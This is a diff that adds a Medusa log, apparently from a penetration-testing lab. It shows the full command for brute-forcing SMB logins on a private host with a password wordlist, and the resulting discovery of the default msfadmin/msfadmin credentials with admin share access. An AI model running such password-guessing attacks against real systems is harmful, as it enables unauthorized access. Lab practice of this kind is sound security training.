@@ -1,0 +1,4 @@
+# Medusa v.2.3 (2025-10-05 19:23:55)
+# medusa -h 192.168.122.128 -u msfadmin -P wordlists/smb_passwords.txt -M smbnt -t 2 -f -O logs/smb_simple.log 
+2025-10-05 19:23:56 ACCOUNT FOUND: [smbnt] Host: 192.168.122.128 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
+# Medusa has finished (2025-10-05 19:23:56).
